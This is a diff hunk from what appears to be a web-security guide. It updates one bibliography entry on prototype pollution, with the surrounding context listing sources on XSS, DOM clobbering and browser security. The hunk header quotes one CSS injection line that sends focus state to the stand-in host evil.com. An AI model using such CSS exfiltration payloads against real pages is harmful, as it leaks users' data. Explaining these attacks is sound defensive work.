@@ -943,7 +943,7 @@ input:focus { background: url(https://evil.com/leak?focus=1); }
 4. Heiderich, M. "Mutation XSS (mXSS)." https://web.archive.org/web/2023/https://www.mbsd.jp/
 5. Gareth Heyes. "DOM Clobbering." PortSwigger Research, 2020. https://portswigger.net/research/dom-clobbering-strikes-back
 6. PortSwigger Ltd. "Prototype Pollution." https://portswigger.net/web-security/prototype-pollution
-7. Snyk. "Prototype Pollution in JavaScript." https://snyk.io/learn/
+7. Snyk. "What is Prototype Pollution?" Snyk Learn. https://learn.snyk.io/lesson/prototype-pollution/
 8. W3C. "Web Workers and Service Workers." https://www.w3.org/TR/service-workers/
 9. WHATWG. "postMessage API." https://html.spec.whatwg.org/multipage/web-messaging.html
 10. Chromium Project. "Chromium Security Architecture." https://www.chromium.org/Home/chromium-security/
